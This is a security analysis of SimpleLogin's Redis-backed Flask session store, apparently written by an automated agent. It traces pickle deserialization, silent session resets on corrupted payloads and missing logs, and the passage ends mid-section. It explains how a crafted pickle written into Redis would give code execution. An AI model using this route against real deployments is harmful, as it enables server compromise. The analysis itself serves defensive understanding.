# How SimpleLogin's `RedisSessionStore` Deserializes Session Data — and What Happens When the Redis Payload Is Corrupted, Malformed, or Maliciously Tampered With

> **Deliverable:** runtime-grounded investigative answer for the source branch `app_2cd6ee777f8c`.
> **Subject:** the custom Flask `SessionInterface` named `RedisSessionStore(SessionInterface)` in `app/session.py` — the *only* file in the repository that calls `pickle.loads`/`pickle.dumps`.
> **Method:** every behavioral claim below sits next to the **actual, unedited output** of a temporary observation script that exercised the **real** login/logout/request entry points in the canonical Python 3.10 runtime with `RedisSessionStore` active. Every factual claim carries a `file:line` citation and names the exact function/method that performs the work.

---

## TL;DR (one-paragraph answer)

SimpleLogin's server-side session subsystem is a custom Flask `SessionInterface` — `RedisSessionStore` in `app/session.py` — that stores each session's data as a **standard-library `pickle`** blob in Redis under the key `session:<sid>` and identifies it with an `itsdangerous` HMAC-**SHA1**-signed session id carried in the `slapp` cookie. **Deserialization is a single call, `pickle.loads(val)`, in `open_session` at `app/session.py:76`.** When the Redis payload is corrupted or malformed, the *next request* triggers a **silent session reset**: `pickle.loads` raises, a bare `except Exception: pass` at `app/session.py:78-79` swallows the error, and `open_session` falls through to `return ServerSession(session_id=str(uuid.uuid4()))` at `app/session.py:80`. The request does **not** fail and **no** error is surfaced — the user simply appears anonymous and receives a normal `302` redirect to the login page. No session- or pickle-specific line is written to the logs (the module imports no logger, `app/session.py:1-16`), so in the logs the reset is **indistinguishable from a user who was never logged in**. The boundary between a harmless reset and a genuine risk is precise: the *same* code path that harmlessly resets on invalid bytes will **execute arbitrary code** if the attacker-controlled bytes form a *valid, weaponized* pickle whose `__reduce__` returns a callable — the code runs *inside* `pickle.loads` at `app/session.py:76`, **before** the `except` at `:78` can intervene. Finally, the HMAC signature protects **only the session-id pointer** (which Redis key is read; `app/session.py:37-41`), not the integrity of the unsigned pickle payload written by `pickle.dumps(dict(session))` at `app/session.py:91`. Therefore an attacker who can **write to Redis but cannot forge the signed cookie** still reaches `pickle.loads` with attacker-controlled bytes — the victim's own valid, unforged cookie merely points `open_session` at the poisoned key — so being unable to forge the id does **not** meaningfully reduce the risk. This is **CWE-502 (Deserialization of Untrusted Data) / OWASP A08:2021 (Software and Data Integrity Failures)**, closely analogous to the python-socketio advisory **GHSA-g8c6-8fjj-2r4m**; the RCE is contingent on Redis write access and is not reachable by a normal web client who can only present a signed cookie.

---

## 1. Investigation method & canonical environment

### 1.1 Read-only discipline

This is a **documentation / knowledge-extraction** task, not a fix. No existing source file was modified; the only artifact added to the repository is this Markdown document. All observation scripts were placed **outside** the repository (under `/tmp/sl_obs`) and removed after the investigation; the repository working tree is clean except for this file (the actual `git status` / `git diff` output is shown in Appendix B). The deserialization risk described here is **explained, not remediated** — remediation is explicitly out of scope.

### 1.2 Canonical runtime and evidence provenance

**Provenance statement (read this first).** Every evidence block in §2–§7 is the **actual, unedited output of a fresh author rerun** performed for this document — not a re-used capture. The rerun was executed in the platform-provisioned **native host install** of this repository (the destination working tree), which faithfully reproduces the canonical *Python 3.10 + Poetry + PostgreSQL + Redis* configuration selected by `tests/test.env`. The environment instructions also name a canonical Docker image (`ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0`) as an equivalent reference build; the investigation itself was run in the native install described below, and the values reported are that install's actual output.

- **Runtime:** Python **3.10.20** (captured: `python --version` → `Python 3.10.20`, from the repo's `venv/`). This satisfies the canonical constraint declared in `Dockerfile:8` (`FROM python:3.10`), `pyproject.toml:61` (`python = "^3.10"`), and CI `.github/workflows/main.yml:17,40` (`python-version '3.10'` / `["3.10"]`). The host system interpreter is Python 3.13, so the pinned **3.10** virtualenv is used for all canonical observation.
- **Source under investigation vs. destination document.** These are two distinct commits and are kept separate throughout:
  - *Source-branch commit (the code being investigated):* `git rev-parse HEAD~1` = `2cd6ee777f8c2d3531559588bcfb18627ffb5d2c`.
  - *Destination-branch commit (the commit that carries this document):* `git rev-parse HEAD` = `13310d180f949385605d9a3d834d36e6e366e757`. Relative to the source commit, the **only** repository change is the addition of this one document (`git diff --name-status 2cd6ee77 HEAD` → `A blitzy/documentation/app_2cd6ee777f8c.md`; full output in Appendix B).
- **Interpreter / dependency pins** (captured from the venv; exact pins from `poetry.lock`): flask **1.1.2** (`poetry.lock:910-911`), itsdangerous **1.1.0** (`poetry.lock:1617-1618`), redis **4.6.0** (`poetry.lock:2674-2675`), werkzeug **1.0.1** (`poetry.lock:3423-3424`), flask-login **0.5.0** (`poetry.lock:1029-1030`), limits **1.5.1** (`poetry.lock:1759-1760`), flask-limiter **1.4** (`poetry.lock:1013-1014`). No dependency was added, updated, or removed.
- **Backing services (localhost):** PostgreSQL **17.10** on port **15432** (role `test`/`test`, database `test`, 77 tables migrated to the Alembic head) and Redis **8.0.2** (`redis://localhost`).
  - *Honest, non-behavioral deviation:* canonical CI pins `postgres:13` (`.github/workflows/main.yml:47`, mapped `15432:5432` at `:60`) and Redis **v6** (`.github/workflows/main.yml:91-94`), whereas this host runs PostgreSQL **17.10** and Redis **8.0.2**. The server-version difference does not affect the `get`/`setex`/`delete` operations or pickle behavior: the pinned **client** `redis==4.6.0` governs the interaction, and the session store only performs `get`/`setex`/`delete` of an opaque byte string. All byte-sensitive results below are the actual bytes this runtime emitted.
- **Configuration:** `tests/test.env`, which sets `FLASK_SECRET=secret` (`tests/test.env:20`), `DB_URI=postgresql://test:test@localhost:15432/test` (`tests/test.env:17`), `MEM_STORE_URI=redis://localhost` (`tests/test.env:78`), and `URL=http://localhost` (`tests/test.env:2`). Because `MEM_STORE_URI` is set, `RedisSessionStore` is installed — see the activation guard `if MEM_STORE_URI:` at `server.py:163-165`, which calls `initialize_redis_services(app, MEM_STORE_URI)` at `server.py:165`.

The exact provenance commands and their **actual, unedited output** are:

```text
$ python --version
Python 3.10.20

$ redis-cli INFO server | grep '^redis_version'
redis_version:8.0.2

$ psql -h localhost -p 15432 -U test -d test -tAc 'SELECT version();'
PostgreSQL 17.10 (Ubuntu 17.10-0ubuntu0.25.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 15.2.0-4ubuntu4) 15.2.0, 64-bit

$ git rev-parse HEAD          # destination-branch commit carrying this document
13310d180f949385605d9a3d834d36e6e366e757
$ git rev-parse HEAD~1        # source-branch commit under investigation
2cd6ee777f8c2d3531559588bcfb18627ffb5d2c

$ python -c 'import flask,itsdangerous,redis,werkzeug,flask_login,limits,flask_limiter as fl;print(flask.__version__,itsdangerous.__version__,redis.__version__,werkzeug.__version__,flask_login.__version__,limits.__version__,fl.__version__)'
1.1.2 1.1.0 4.6.0 1.0.1 0.5.0 1.5.1 1.4
```

### 1.3 Exact build / run / invocation commands

These are the **exact, literal** commands used — no placeholder tokens (so nothing is misparsed by Bash as a redirection). `REPO_ROOT` is defined once as the actual destination checkout; a reader reproducing this sets it to their own checkout path.

```bash
# --- activate the canonical Python 3.10 environment (native host install) ---
export PATH="$HOME/.local/bin:$PATH"
REPO_ROOT=/tmp/blitzy/app/blitzy-69b57f9c-a60d-44e2-934e-aba188d82f39_8eee3e
cd "$REPO_ROOT"
source venv/bin/activate
export CONFIG="$(pwd)/tests/test.env"      # sets MEM_STORE_URI -> RedisSessionStore
export GITHUB_ACTIONS_TEST=true
export PYTHONPATH="$(pwd)"

# --- backing services (already daemonized in this environment) ---
pg_ctlcluster 17 main start                            # PostgreSQL 17 on localhost:15432
redis-server /etc/redis/redis.conf --daemonize yes     # Redis on 127.0.0.1:6379
CONFIG="$(pwd)/tests/test.env" alembic upgrade head    # one-time DB migration (77 tables)

# --- run the observation scripts (kept OUTSIDE the repo, under /tmp/sl_obs) ---
python /tmp/sl_obs/obs_c.py    # 4.0-4.4: baseline + corrupted + edge/error paths
python /tmp/sl_obs/obs_b.py    # 4.5-4.7: observability + boundary + threat model

# --- cleanup (leaves the repository working tree unchanged; see Appendix B) ---
rm -rf /tmp/sl_obs
rm -f  /tmp/pickle_rce_marker
```

**App-boot verification.** With `CONFIG=tests/test.env`, `create_app()` yields `app.session_interface = app.session.RedisSessionStore`, `SESSION_COOKIE_NAME = slapp`, `app.secret_key = 'secret'`, and `MEM_STORE_URI = 'redis://localhost'` — i.e. the pickle deserialization path is **active** through the real entry points. (This exact activation state is shown as observed output in §2.1 below.)

### 1.4 Canonical entry points exercised

All behavior was exercised through the **real** entry points — never a bypass or synthetic stand-in:

- **login** — `client.post(url_for("auth.login"), data={"email": ..., "password": "password"}, follow_redirects=True)` → the `login()` view at `app/auth/views/login.py:25`, which on success calls `after_login()` at `app/auth/views/login_utils.py:12` (`login_user()` at `:36`, `session["sudo_time"] = int(time())` at `:37`).
- **authenticated request** — `client.get("/dashboard/")` → routed through `open_session` on the way in and `save_session` on the way out.
- **logout** — `client.get(url_for("auth.logout"))` → the `logout()` view at `app/auth/views/logout.py:9`, which calls `logout_session()` at `:10` and deletes the `slapp`/`mfa`/`dark-mode` cookies at `:13-15`.
- **API logout** — `GET /api/logout` (`app/api/views/user_info.py:131`) calls the **identical** `logout_session()` at `:140`; this path is labeled **verified-by-code-reference (same mechanism as web logout)**, not runtime-exercised (see §7.5).

The scripts mirror the canonical `tests/conftest.py` harness exactly: `os.environ["CONFIG"]=tests/test.env`, `app = create_app()`, `app.config["TESTING"]=True`, `WTF_CSRF_ENABLED=False`, `SERVER_NAME="sl.test"`, the `pg_trgm` extension plus `add_sl_domains()` and `add_proton_partner()`, and a `create_new_user()` (password `"password"`, `tests/utils.py:17`), all wrapped in `connection.begin()` and rolled back at teardown. Redis handles are read from `app.session_interface._redis_r` / `._redis_w`. This is the exact template used by `tests/auth/test_login.py` and `tests/utils.py::login()` (`:46-59`).

### 1.5 A note on logging capture technique

SimpleLogin's `SL` logger writes to the process's **original stdout file descriptor**, established when logging is initialized at import time. Ordinary Python-level stdout redirection (reassigning `sys.stdout`) does **not** intercept it. To observe the logs honestly, §4 uses **OS file-descriptor-level capture**: `os.dup2()` redirects **fd 1 (stdout) only** — the descriptor the `SL` logger writes to — to a temp file around a single request, then restores it (the `capture_fd` helper is shown in Appendix A.2). This guarantees the captured log lines are exactly what the server emitted.

### 1.6 Byte-sensitivity and reproducibility

Byte-sensitive results were **captured, not assumed**: the pickle protocol was read from the emitted bytes (`pickle.DEFAULT_PROTOCOL = 4` on this Python 3.10.20 runtime; every emitted payload begins with `\x80\x04`, the PROTO opcode for protocol 4), and the `itsdangerous` cookie signature was verified by reproducing it with `signer.sign(...)`. All evidence below is the actual, unedited output from the canonical runtime. Per-run values (session ids, signatures, timestamps, user emails, `sudo_time`) differ from run to run, but the structure and behavior are **stable** — verified by running the baseline/corrupted/edge script twice end-to-end (≈6 logins per run) plus the boundary/threat script, and confirming every structural invariant matched. In particular the flask-login "strong" session fingerprint `_id` (`002d6488…0c0916`) was **byte-identical across both baseline runs** (it is a deterministic function of the fixed request environment), while session ids and signatures varied as expected.

---

## 2. Baseline session lifecycle (login → logout)

This section documents what a "normal" session looks like at runtime: how it is created on login, what is written to Redis, what the signed cookie carries, and how logout tears it down.

### 2.1 Environment / activation (observed)

The following was dumped at the top of the observation script, confirming the pickle path is active and capturing the serializer/signer configuration:

```text
session_interface        = app.session.RedisSessionStore
redis client type        = redis.client.Redis
SESSION_COOKIE_NAME       = slapp
app.secret_key            = 'secret'
MEM_STORE_URI             = 'redis://localhost'
permanent_session_lifetime= 31 days, 0:00:00 -> 2678400 s
pickle.DEFAULT_PROTOCOL   = 4 ; HIGHEST_PROTOCOL = 5
signer                    = itsdangerous.signer.Signer
signer.digest_method      = <built-in function openssl_sha1>
signer.sep                = b'.'
```

**Interpretation (with citations):**

- `app.session_interface` is `app.session.RedisSessionStore`, installed by `initialize_redis_services` (`app/redis_services.py:9`) — the **sole wiring function** that assigns `app.session_interface` anywhere in the repository. That function has two branches and **both** assign the store: the normal `redis://` branch constructs a `RedisStorage` (`app/redis_services.py:11`) and assigns `app.session_interface = RedisSessionStore(...)` at `:12`, while the Redis-Sentinel branch constructs a `RedisSentinelStorage` (`:16`) and assigns the store at `:17-19`. The canonical `MEM_STORE_URI=redis://localhost` selects the normal branch (`:12`). `initialize_redis_services` runs only because `MEM_STORE_URI` is set — the activation guard `if MEM_STORE_URI:` at `server.py:163-165` calls it (`MEM_STORE_URI` defined at `app/config.py:568`).
- `SESSION_COOKIE_NAME = slapp` comes from `SESSION_COOKIE_NAME = "slapp"` at `app/config.py:199`.
- `app.secret_key = 'secret'` comes from `app.secret_key = FLASK_SECRET` at `server.py:151`, sourced from `FLASK_SECRET = os.environ["FLASK_SECRET"]` (`app/config.py:196-198`, with a mandatory non-empty guard) and supplied by `tests/test.env:20`.
- The serializer is stdlib `pickle` at **protocol 4** — on Python 3 the `try: import cPickle as pickle / except ImportError: import pickle` block at `app/session.py:9-12` falls back to the standard-library `pickle`. `pickle.DEFAULT_PROTOCOL = 4` was **captured** here, not assumed.
- The signer is `itsdangerous.signer.Signer` with `digest_method = openssl_sha1` (HMAC-**SHA1**) — constructed by `_get_signer` as `itsdangerous.Signer(app.secret_key, salt="session", key_derivation="hmac")` at `app/session.py:37-41`.

**Important TTL nuance (observed + explained).** The line `permanent_session_lifetime = 31 days` is read **at rest** (module import, outside any request), where it equals Flask's default. During any real request, the `@app.before_request def make_session_permanent()` at `server.py:204-207` sets `app.permanent_session_lifetime = timedelta(days=7)`, and `save_session` reads *that* per-request value at `app/session.py:92`. Hence the authenticated Redis TTL observed at login (§2.2) is **604800 s (7 days)**, while an anonymous session's TTL is **300 s** — the `if "_user_id" not in session: ttl = 300` branch at `app/session.py:95-96`. Both TTLs are **observed**, not merely inferred from the code: 604800 s on the authenticated key in §2.2, and 300 s on the anonymous key that is re-saved during logout in §2.3. The at-rest value (31 days) and the per-request effects (7 days / 300 s) are all reported from captured `setex` output.

### 2.2 Login — `POST auth.login` (observed)

```text
BEFORE login: session:* keys = [] ; slapp cookie = None
login_url = http://sl.test/auth/login ; logout_url = http://sl.test/auth/logout
POST auth.login -> status 200 ; authenticated (b'/auth/logout' in body) = True

slapp cookie (VERBATIM) = 'f69ae02a-ef78-46ba-ab97-661d0f0968f3.iSe1Ejdxetu4eG_ToPn97x_o-YI'
  sid_part = 'f69ae02a-ef78-46ba-ab97-661d0f0968f3' (uuid4)
  sig_part = 'iSe1Ejdxetu4eG_ToPn97x_o-YI'
  signer.unsign(cookie) = f69ae02a-ef78-46ba-ab97-661d0f0968f3
  signer.validate(cookie) = True
  RECONSTRUCT signer.sign(sid_part) == emitted cookie ?  True

Redis key                = session:f69ae02a-ef78-46ba-ab97-661d0f0968f3
Redis raw bytes (VERBATIM repr) = b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\x08_user_id\x94\x8c$3b510910-8469-4695-8058-e5607f26cf2a\x94\x8c\x03_id\x94\x8c\x80002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916\x94\x8c\tsudo_time\x94J\xe1)Uju.'
first two bytes          = b'\x80\x04' => PROTO opcode 0x80, protocol=4
TTL (setex)              = 604800 s
pickle.loads(raw)        = {'_permanent': True, '_fresh': True, '_user_id': '3b510910-8469-4695-8058-e5607f26cf2a', '_id': '002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916', 'sudo_time': 1783966177}
payload keys (sorted)    = ['_fresh', '_id', '_permanent', '_user_id', 'sudo_time']
pickletools.dis(raw):
    0: \x80 PROTO      4
    2: \x95 FRAME      233
   11: }    EMPTY_DICT
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE '_permanent'
   26: \x94     MEMOIZE    (as 1)
   27: \x88     NEWTRUE
   28: \x8c     SHORT_BINUNICODE '_fresh'
   36: \x94     MEMOIZE    (as 2)
   37: \x88     NEWTRUE
   38: \x8c     SHORT_BINUNICODE '_user_id'
   48: \x94     MEMOIZE    (as 3)
   49: \x8c     SHORT_BINUNICODE '3b510910-8469-4695-8058-e5607f26cf2a'
   87: \x94     MEMOIZE    (as 4)
   88: \x8c     SHORT_BINUNICODE '_id'
   93: \x94     MEMOIZE    (as 5)
   94: \x8c     SHORT_BINUNICODE '002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916'
  224: \x94     MEMOIZE    (as 6)
  225: \x8c     SHORT_BINUNICODE 'sudo_time'
  236: \x94     MEMOIZE    (as 7)
  237: J        BININT     1783966177
  242: u        SETITEMS   (MARK at 13)
  243: .    STOP
highest protocol among opcodes = 4
```

**Interpretation (with citations):**

- **The cookie is `<sid>.<signature>`.** The signature is an `itsdangerous` HMAC-SHA1 MAC over the **session id string only**, keyed by `app.secret_key` with `salt="session"` (`app/session.py:37-41`). Two independent checks prove the signature covers the sid exclusively: `signer.validate(cookie)` returns `True`, and reconstructing `signer.sign(sid_part)` reproduces the emitted cookie **byte-for-byte** (`RECONSTRUCT ... == emitted cookie ? True`). This signing happens in `save_session` — `signed_session_id = self._get_signer(app).sign(itsdangerous.want_bytes(session.session_id))` and `response.set_cookie(...)` at `app/session.py:102-114`.
- **The Redis value is a raw pickle blob.** The key is `session:<sid>` built by `_get_key` (`f"{SESSION_PREFIX}:{session_Id}"`, `SESSION_PREFIX = "session"` at `app/session.py:18`, `app/session.py:43-45`). The value is `pickle.dumps(dict(session))` written by `save_session` at `app/session.py:91` via `self._redis_w.setex(...)` (`app/session.py:97-101`). The captured bytes begin with `\x80\x04` — the PROTO opcode for **protocol 4** — confirming the serializer and protocol from the emitted bytes (verified again by `pickletools.dis`, `highest protocol among opcodes = 4`).
- **The payload dict** is `{_permanent, _fresh, _user_id, _id, sudo_time}`. There is **no `csrf_token`** because the canonical harness sets `WTF_CSRF_ENABLED=False`. `_user_id` is the flask-login user id (`user.get_id()`); `_id` is the flask-login **"strong" session-protection** fingerprint, enabled by `login_manager.session_protection = "strong"` at `app/extensions.py:8`; `sudo_time` is written by `after_login()` at `app/auth/views/login_utils.py:37`.
- **The TTL is 604800 s (7 days)** because `"_user_id"` is present in the session, so the `ttl = 300` branch is *not* taken — `ttl = int(app.permanent_session_lifetime.total_seconds())` with the per-request 7-day lifetime (`app/session.py:92`, `:95-96`; the 7-day value set by `make_session_permanent`, `server.py:204-207`).

### 2.3 Logout — `GET auth.logout` (observed)

```text
session:* keys BEFORE logout = ['session:f69ae02a-ef78-46ba-ab97-661d0f0968f3']
GET auth.logout -> status 302 ; Location = http://sl.test/auth/login
Set-Cookie headers (VERBATIM, in order):
  1) slapp=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  2) mfa=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  3) dark-mode=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  4) slapp=77e08d9d-bf53-43a3-b1db-8b216e5a8319.1CpPzaGJC1tYtGMSAQoqoZLqoF0; Domain=.sl.test; Expires=Mon, 20-Jul-2026 18:09:37 GMT; HttpOnly; Path=/; SameSite=Lax
redis GET <old authenticated key> AFTER logout = None
session:* keys AFTER logout = ['session:77e08d9d-bf53-43a3-b1db-8b216e5a8319']
slapp cookie in jar AFTER logout = '77e08d9d-bf53-43a3-b1db-8b216e5a8319.1CpPzaGJC1tYtGMSAQoqoZLqoF0' (LAST Set-Cookie wins)
NEW (post-logout) Redis key = session:77e08d9d-bf53-43a3-b1db-8b216e5a8319
NEW payload raw bytes (VERBATIM repr) = b'\x80\x04\x95S\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\tsudo_time\x94J\xe1)Uj\x8c\x08_flashes\x94]\x94\x8c\x07success\x94\x8c\x12You are logged out\x94\x86\x94au.'
NEW payload pickle.loads = {'_permanent': True, 'sudo_time': 1783966177, '_flashes': [('success', 'You are logged out')]}
NEW payload keys (sorted) = ['_flashes', '_permanent', 'sudo_time']
NEW payload TTL (setex)  = 300 s  (anonymous: '_user_id' absent -> 300 branch)
```

**Interpretation (with citations):**

- `logout()` (`app/auth/views/logout.py:9-16`) calls `logout_session()` (`app/session.py:117-121`), which calls `logout_user()` then `purge_session()` (`app/session.py:61-66`). `purge_session` **DELETEs** the authenticated Redis key — `self._redis_w.delete(self._get_key(session.session_id))` at `app/session.py:63` — and assigns a fresh `uuid.uuid4()` at `:64`. This is confirmed by `redis GET <old authenticated key> AFTER logout = None`.
- The view then deletes the `slapp`, `mfa`, and `dark-mode` cookies (`app/auth/views/logout.py:13-15`) → **Set-Cookie headers 1–3** (empty value, `Max-Age=0`, epoch expiry).
- **Observed nuance beyond the naïve "just delete it" model (this is *not* a brand-new empty session).** `purge_session` does not create a new session object — it **mutates the current one in place**: it DELETEs the old Redis key (`app/session.py:63`) and reassigns `session.session_id = str(uuid.uuid4())` (`app/session.py:64`). `logout_user()` (flask-login 0.5.0) pops the authentication keys `_user_id`, `_fresh`, and `_id` (verified in `flask_login/utils.py::logout_user`), leaving the non-authentication keys in place. Because `make_session_permanent` set `session.permanent = True` earlier in the request (`server.py:206`), the `_permanent` key remains, and the pre-existing `sudo_time` (written at login by `after_login()`, `app/auth/views/login_utils.py:37`) is **not** cleared by logout. (`logout_user()` also toggles a transient `_remember` marker, but flask-login's own `_update_remember_cookie` after-request handler `session.pop('_remember', ...)`s it before the response is saved, which is why it does **not** appear in the persisted payload decoded below.) Then, before the response is built, `flash("You are logged out", "success")` at `app/auth/views/logout.py:11` **adds a `_flashes` entry** to that same session. Finally, `save_session` runs on the way out and persists this now-anonymous — **but non-empty** — dict under the new sid → **Set-Cookie header 4** (a new signed `slapp` pointing at the new key).
- **The post-logout payload was decoded to prove its contents** (it is *not* empty): `pickle.loads` of the new key yields `{'_permanent': True, 'sudo_time': 1783966177, '_flashes': [('success', 'You are logged out')]}` (`NEW payload keys (sorted) = ['_flashes', '_permanent', 'sudo_time']`). Crucially, the authentication keys `_user_id`/`_fresh`/`_id` are **gone**, so flask-login treats the client as anonymous, but `sudo_time` and the logout flash **survive**. The new key is stored with **TTL 300 s** — the anonymous branch `if "_user_id" not in session: ttl = 300` at `app/session.py:95-96`, in contrast to the authenticated 604800 s at login.
- Being the *last* `Set-Cookie`, header 4 wins in the client jar, which is why `session:*` after logout shows the new key and the jar holds the new cookie. The net security effect is nonetheless correct: the **authenticated** payload is destroyed (old key GET = `None`), the surviving payload carries **no credential**, and the user is anonymous on the next request.


---

## 3. Corrupted / malformed payload behavior (the core question)

**Question (b):** on the *next request* after the Redis payload becomes invalid pickle, does the request **fail**, **silently reset** the session, or **surface an error** to the user?

**Answer: silent reset.** The request does not fail and no error is surfaced; the session is silently replaced with a fresh anonymous one, and the user receives a normal `302` redirect to the login page.

### 3.1 Observed — authenticate, corrupt the Redis payload, issue the next real request

```text
BEFORE corruption: authenticated sid = 521524b4-cb78-4ccc-98bc-7a92f0f42b73 ; GET /dashboard/ -> 200 (200=authenticated)
DURING: direct pickle.loads(malformed) RAISES: UnpicklingError: invalid load key, '\x00'.
AFTER (next real GET /dashboard/): status = 302 ; Location = http://sl.test/auth/login?next=%2Fdashboard%2F%3F
  pickle.loads invoked = 1 x ; swallowed exception = UnpicklingError("invalid load key, '\\x00'.")
  sid CHANGED 521524b4-cb78-4ccc-98bc-7a92f0f42b73 -> b87bd80a-9378-4b63-910b-5250bdf5af48 == SILENT RESET
```

The malformed bytes written to the Redis key were:

```text
b"\x00this is definitely not a valid pickle stream\xff\xfe"
```

The before/during/after state was recorded explicitly:

- **Before:** a genuinely authenticated session (`GET /dashboard/ -> 200`), sid `521524b4-...`.
- **During:** calling `pickle.loads` directly on the malformed bytes raises `UnpicklingError: invalid load key, '\x00'.` — proving the bytes are undecodable.
- **After:** the next real `GET /dashboard/` returns `302` to the login page, `pickle.loads` was invoked exactly **once** and its exception was swallowed, and the session id **changed** — a silent reset.

### 3.2 Line-by-line trace of `open_session` (`app/session.py:68-80`)

The crux is the `open_session` method. On the corrupted-payload request it executes as follows:

1. `session_id = self.extract_and_validate_session_id(app, request)` (`app/session.py:69`) — the `slapp` cookie is still validly signed (only the *Redis payload* was corrupted, not the cookie), so this returns the real sid.
2. `if not session_id:` (`:70`) is **false**, so the early fresh-session return at `:71` is skipped.
3. `val = self._redis_r.get(self._get_key(session_id))` (`:73`) — reads the corrupted bytes.
4. `if val is not None:` (`:74`) is **true** (the corrupted value exists).
5. `data = pickle.loads(val)` (`:76`) — **raises** `UnpicklingError` (observed above; `pickle.loads invoked = 1 x`).
6. `except Exception:` (`:78`) catches it; `pass` (`:79`) swallows it silently — no re-raise, no logging.
7. Control falls through to `return ServerSession(session_id=str(uuid.uuid4()))` (`:80`) — a brand-new empty session with a new uuid4 id.

Because the restored session is empty (no `_user_id`), flask-login treats the user as anonymous. The `302` redirect is then produced by a **two-step chain**, not directly by `@login_required`: the dashboard route (`/dashboard/`, `@dashboard_bp.route("/")` at `app/dashboard/views/index.py:55`) carries `@login_required` (`:56`); when it fails, flask-login's `unauthorized()` handler runs, but because **no `login_view` is configured** on the `LoginManager` (`app/extensions.py:7-8` sets only `session_protection = "strong"`), flask-login cannot redirect to a login page itself and instead calls `abort(401)`. That `401` is caught by the app-wide `@app.errorhandler(401)` at `server.py:347-353`, which — for a non-`/api/` path — issues `flash(...)` + `redirect(url_for("auth.login", next=request.full_path))`, yielding the `302` to `/auth/login`. The observed `Location: http://sl.test/auth/login?next=%2Fdashboard%2F%3F` confirms this exact path: the `next=%2Fdashboard%2F%3F` query is `request.full_path` of `/dashboard/` (URL-encoded, including the trailing `?`), which only the `errorhandler(401)` branch sets. (The `/dashboard` and `/auth` URL prefixes come from the blueprints registered at `app/dashboard/base.py:3-8` and `app/auth/base.py:3-5`.) Separately, the bare, non-logging `except Exception: pass` at `app/session.py:78-79` is precisely why the deserialization failure itself is **silent**: the error never propagates to the request handler and never becomes a `500` — the `302` is an ordinary unauthenticated-access redirect, indistinguishable from a user who was never logged in.


---

## 4. Response & log observability

**Question (c):** what actually appears in the HTTP **response** and in the server **logs** when the reset occurs?

**Answer:** the HTTP response is a normal `302` redirect to `/auth/login` (no error page, no `500`). The logs contain **exactly one** line for the request — the same generic per-request line that `after_request()` (`server.py:272-296`) prints for **every non-excluded** request (a short exclusion list at `server.py:276-281` skips only `/static`, `/admin/static`, `/_debug_toolbar`, `/git`, `/favicon.ico`, and `/health`; `/dashboard/` is **not** excluded, so it is logged) — with the only difference being the HTTP status code (`302` instead of `200`). There is **no** session/pickle/unpickle/reset/error-specific log line.

### 4.1 The module imports no logging facility (grep proof + import block)

```text
$ grep -nE 'import logging|from .*log|LOG|logger|logging\.' app/session.py
6:from flask_login import logout_user
```

The only match is the substring `log` inside `logout_user`; there is no logger, no `LOG`, no `logging` import anywhere in the module. The full import block is `app/session.py:1-16`:

```python
import uuid
from typing import Optional

import flask
from flask import current_app, session
from flask_login import logout_user


try:
    import cPickle as pickle
except ImportError:
    import pickle

import itsdangerous
from flask.sessions import SessionMixin, SessionInterface
from werkzeug.datastructures import CallbackDict
```

Because `open_session`'s handler is `except Exception: pass` (`app/session.py:78-79`) and the module has no logger, the swallowed deserialization error produces **no log output of its own**.

### 4.2 OS fd-level capture: one NORMAL vs one CORRUPTED→RESET request

Using file-descriptor-level capture (see §1.5), the log output of a single normal authenticated request and a single corrupted→reset request was recorded:

```text
(A) NORMAL authenticated GET /dashboard/ (200) log lines:
    2026-07-13 17:55:12,179 - SL - DEBUG - 61973 - "/tmp/blitzy/app/blitzy-69b57f9c-a60d-44e2-934e-aba188d82f39_8eee3e/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard/ ImmutableMultiDict([]) 200, takes 0.04502582550048828
(B) CORRUPTED->RESET GET /dashboard/ (302) log lines:
    2026-07-13 17:55:12,182 - SL - DEBUG - 61973 - "/tmp/blitzy/app/blitzy-69b57f9c-a60d-44e2-934e-aba188d82f39_8eee3e/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard/ ImmutableMultiDict([]) 302, takes 0.00033736228942871094
reset-log mentions pickle/unpickl/reset/corrupt/badsignature = False
session.py emitted anything = False
```

**Interpretation (with citations):**

- The reset emits **exactly one** log line, and it is the **same** generic per-request line that `after_request()` (`server.py:284`, inside the `server.py:272-296` handler) prints for **every non-excluded** request (the exclusion list at `server.py:276-281` covers only `/static`, `/admin/static`, `/_debug_toolbar`, `/git`, `/favicon.ico`, `/health`). The only difference from a normal request is the HTTP status: `302` (reset → anonymous → `abort(401)` → `errorhandler(401)` redirect, per the chain in §3.2) versus `200` (authenticated).
- There is **no** session-, pickle-, unpickle-, reset-, or `BadSignature`-specific log line — programmatically confirmed by `reset-log mentions pickle/unpickl/reset/corrupt/badsignature = False` and `session.py emitted anything = False`. This follows directly from the swallow-without-logging at `app/session.py:78-79` and the absence of a logger in the module (`app/session.py:1-16`).
- **Consequence:** in the logs, a corrupted-payload reset is **indistinguishable from a user who simply was not logged in**. Both produce the identical `after_request()` line differing only by the `302` status. The HTTP response itself is a normal redirect to the login page — there is no error surfaced to the user or to log-based monitoring.


---

## 5. Edge / error paths

Beyond the corrupted-payload case, four related conditions were exercised through the real path. Each records the number of `pickle.loads` invocations, distinguishing which conditions ever reach the deserializer — and, crucially, distinguishing a **deleted** key (`None`, guard short-circuits) from a **stored-empty** `b''` value (not `None`, so `pickle.loads` *is* called and raises `EOFError`).

```text
CONDITION 3a - DELETED / MISSING REDIS VALUE (pickle.loads never reached)
redis.get(key) after delete = None
